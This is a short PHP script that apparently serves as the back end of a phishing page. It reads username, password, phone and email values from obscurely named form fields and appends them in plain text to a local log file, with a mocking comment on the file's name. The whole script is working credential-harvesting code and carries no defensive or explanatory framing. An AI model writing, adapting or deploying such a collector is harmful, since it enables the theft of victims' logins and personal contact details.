<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["zwous"];
    $password = $_POST["zwoup"];
    $phone = $_POST["zwopho"];
    $email = $_POST["zwomai"];
    
    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "Phone: " . $phone . "\n" . "Email: " . $email . "\n\n";
    
    $file = fopen("fucked.txt", "a"); // Open the creatively named file in append mode
    fwrite($file, $data);
    fclose($file);
}
?>
